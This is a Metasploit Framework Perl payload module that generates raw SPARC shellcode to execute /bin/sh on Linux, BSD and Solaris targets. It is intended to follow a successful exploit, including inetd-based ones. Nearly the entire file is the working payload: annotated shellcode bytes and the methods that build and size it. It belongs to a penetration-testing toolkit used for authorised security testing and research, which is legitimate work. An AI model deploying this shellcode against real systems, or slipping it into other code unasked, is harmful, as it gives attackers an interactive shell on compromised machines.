
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::generic_sparc_execve;
use strict;
use base 'Msf::PayloadComponent::FindConnection';

my $info =
{
  'Name'         => 'BSD/Linux/Solaris SPARC Execute Shell',
  'Version'      => '$Revision$',
  'Description'  => 'Execute a shell on the default file descriptors',
  'Authors'      => [ 'vlad902 <vlad902 [at] gmail.com>', ],
  'Arch'         => [ 'sparc' ],
  'Priv'         => 0,
  'OS'           => [ 'linux', 'bsd', 'solaris' ],
  'Size'         => '',
  'Keys'         => ['inetd'], # can use execve for inetd-based exploits
};

sub new {
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHash($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);

  $self->_Info->{'Size'} = $self->_GenSize;
  return($self);
}

sub Build {
  my $self = shift;
  return($self->Generate());
}

sub Generate {
  my $self = shift;

  my $shellcode =
    "\x9c\x2b\xa0\x07".			# andn %sp, 7, %sp
    "\x94\x1a\xc0\x0b".			# xor %o3, %o3, %o3
    "\x21\x0b\xd8\x9a".			# sethi 0x2f626800, %l0
    "\xa0\x14\x21\x6e".			# or %l0, 0x16e, %l0
    "\x23\x0b\xdc\xda".			# sethi 0x2f736800, %l1
    "\x90\x23\xa0\x10".			# sub %sp, 0x10, %o0
    "\x92\x23\xa0\x08".			# sub %sp, 8, %o1
    "\xe0\x3b\xbf\xf0".			# std %l0, [ %sp - 16 ]
    "\xd0\x23\xbf\xf8".			# st %o0, [ %sp - 8 ]
    "\xc0\x23\xbf\xfc".			# st %g0, [ %sp - 4 ]
    "\x82\x10\x20\x3b".			# mov 0x3b, %g1
    "\x91\xd0\x20\x08";			# ta 8

  return($shellcode);
}

sub _GenSize {
  my $self = shift;
  my $bin = $self->Generate();
  return(length($bin));
}

1;
